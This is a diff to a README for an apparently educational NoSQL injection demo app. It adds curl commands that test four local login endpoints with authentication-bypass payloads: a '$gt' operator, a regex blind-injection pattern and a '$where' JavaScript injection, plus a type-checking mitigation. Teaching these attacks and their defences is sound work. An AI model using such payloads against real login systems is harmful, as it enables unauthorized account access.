@@ -60,41 +60,65 @@ db.users.insertOne({
 The application will be available at: `http://localhost:3000`
 
 ## 6. Testing the Application
-This demo includes two login endpoints for testing NoSQL injection attacks: one vulnerable and one secure.
+This demo includes four login endpoints for testing different NoSQL injection attacks and mitigations.
 
 ### Web Interface Testing
 - Open `http://localhost:3000` in your browser
 - Use the login form to test normal authentication and injection payloads
-- The form sends requests to the vulnerable endpoint (`/api/auth/login`) by default
-- Example payloads for vulnerable endpoint:
-  - Normal login: username: "admin_hien", password: "TDTU_super_secret_password_2026"
-  - Injection bypass: username: "admin_hien", password: {"$gt": ""}
+- Select different endpoints from the dropdown to test various attack vectors
+- Example payloads for each endpoint:
 
 ### CLI Testing (using curl)
-Use these commands to test both vulnerable and secure endpoints:
+Use these commands to test all four endpoints:
 
-#### Vulnerable Endpoint (/api/auth/login) - Allows Injection
+#### Snippet 1: Vulnerable Backend Authentication Logic (/login) - Allows Logic Bypass
 ```bash
 # Normal login
-curl -X POST http://localhost:3000/api/auth/login \
+curl -X POST http://localhost:3000/login \
 -H "Content-Type: application/json" \
 -d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'
 
 # Injection bypass ($gt)
-curl -X POST http://localhost:3000/api/auth/login \
+curl -X POST http://localhost:3000/login \
 -H "Content-Type: application/json" \
 -d '{"username": "admin_hien", "password": {"$gt": ""}}'
 ```
 
-#### Secure Endpoint (/api/auth/login-secure) - Blocks Injection
+#### Snippet 2: Advanced Blind Injection (Regex Implementation) (/login-regex) - Allows Regex Injection
+```bash
+# Normal login
+curl -X POST http://localhost:3000/login-regex \
+-H "Content-Type: application/json" \
+-d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'
+
+# Regex injection (matches any password starting with "TDTU")
+curl -X POST http://localhost:3000/login-regex \
+-H "Content-Type: application/json" \
+-d '{"username": "admin_hien", "password": "^TDTU"}'
+```
+
+#### Snippet 3: Server-Side JavaScript Injection (SSJI via $where) (/login-script) - Allows JS Code Execution
+```bash
+# Normal login
+curl -X POST http://localhost:3000/login-script \
+-H "Content-Type: application/json" \
+-d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'
+
+# JS injection (always true)
+curl -X POST http://localhost:3000/login-script \
+-H "Content-Type: application/json" \
+-d '{"username": "admin_hien", "password": "1==1"}'
+```
+
+#### Snippet 4: Secure Mitigation (Type Checking) (/login-secure) - Blocks Injection
 ```bash
 # Normal login (works)
-curl -X POST http://localhost:3000/api/auth/login-secure \
+curl -X POST http://localhost:3000/login-secure \
 -H "Content-Type: application/json" \
 -d '{"username": "admin_hien", "password": "TDTU_super_secret_password_2026"}'
 
 # Injection attempt (blocked)
-curl -X POST http://localhost:3000/api/auth/login-secure \
+curl -X POST http://localhost:3000/login-secure \
 -H "Content-Type: application/json" \
 -d '{"username": "admin_hien", "password": {"$gt": ""}}'
 ```
